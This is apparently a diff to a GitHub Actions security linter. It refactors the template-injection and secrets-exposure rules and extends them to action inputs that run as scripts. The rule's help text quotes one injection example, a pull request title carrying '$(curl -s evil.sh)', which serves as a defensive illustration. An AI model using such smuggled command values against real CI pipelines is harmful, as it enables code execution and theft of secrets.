@@ -24,6 +24,7 @@ from .expressions import (
 )
 from .model import Finding, Severity
 from .project import repo_root
+from .scripts import scripts
 from .taint import INPUT, OUTSIDER, TOJSON, Taint, Tracker
 from .workflow import Step, Workflow, get, items, key_node, scalar
 
@@ -161,13 +162,8 @@ def _injection_text(path: ContextPath, taint: Taint) -> str:
 def template_injection(wf: Workflow) -> Iterator[Finding]:
     tracker = Tracker(wf)
     for tracked in tracker.steps():
-        step = tracked.step
-        targets = [get(step.node, "run")]
-        if (step.uses or "").startswith("actions/github-script@"):
-            targets.append(get(get(step.node, "with"), "script"))
-        for node in targets:
-            if not isinstance(node, ScalarNode):
-                continue
+        for script in scripts(tracked.step):
+            node = script.node
             for expr in find_expressions(node.value):
                 hit = tracker.taint_of_expression(expr, tracked.scope)
                 if hit is None:
@@ -176,9 +172,8 @@ def template_injection(wf: Workflow) -> Iterator[Finding]:
                 if node.style in ("|", ">"):
                     offset += 1  # the text starts on the line after "run: |"
                 path, taint = hit
-                yield _at(
-                    wf, node, "WG004", taint.severity, _injection_message(path, taint), line_offset=offset
-                )
+                message = _injection_message(path, taint) + script.hint()
+                yield _at(wf, node, "WG004", taint.severity, message, line_offset=offset)
 
 
 # --- WG007 untrusted text in $GITHUB_ENV / $GITHUB_PATH ----------------------------------------
@@ -270,12 +265,8 @@ def secrets_exposure(wf: Workflow) -> Iterator[Finding]:
 
     # ${{ secrets.X }} pasted into a script.
     for step in wf.steps():
-        targets = [get(step.node, "run")]
-        if (step.uses or "").startswith("actions/github-script@"):
-            targets.append(get(get(step.node, "with"), "script"))
-        for node in targets:
-            if not isinstance(node, ScalarNode):
-                continue
+        for script in scripts(step):
+            node = script.node
             for expr in find_expressions(node.value):
                 path = next(
                     (p for p in _paths(expr) if p.segments[0] == "secrets" and not _is_all_secrets(p)),
@@ -291,7 +282,7 @@ def secrets_exposure(wf: Workflow) -> Iterator[Finding]:
                     Severity.MEDIUM,
                     f"'{name}' is pasted into the script text: quotes or '$' in the secret break the"
                     " script, and 'set -x', an error message or a process listing can show it."
-                    f" Pass it through 'env:' and use the variable instead",
+                    f" Pass it through 'env:' and use the variable instead{script.hint()}",
                     line_offset=_expression_offset(node, expr.start),
                 )
 
@@ -622,13 +613,16 @@ RULES: tuple[Rule, ...] = (
     Rule(
         "WG004",
         "template-injection",
-        "Untrusted ${{ }} values (or inputs from unknown callers) inside run: or github-script",
+        "Untrusted ${{ }} values (or inputs from unknown callers) inside run:, github-script or"
+        " an action's script input",
         template_injection,
         help=(
             "${{ }} values are pasted into the script before it runs, so a pull request title like "
             '$(curl -s evil.sh) runs as code. Pass the value through env: and use "$VAR" in the '
             "script instead. In a composite action or reusable workflow the same goes for "
-            "${{ inputs.* }}: the calling workflow may pass untrusted text."
+            "${{ inputs.* }}: the calling workflow may pass untrusted text. Actions that run an "
+            "input as a script (appleboy/ssh-action's script, azure/cli's inlineScript, ...) are "
+            "checked too."
         ),
     ),
     Rule(
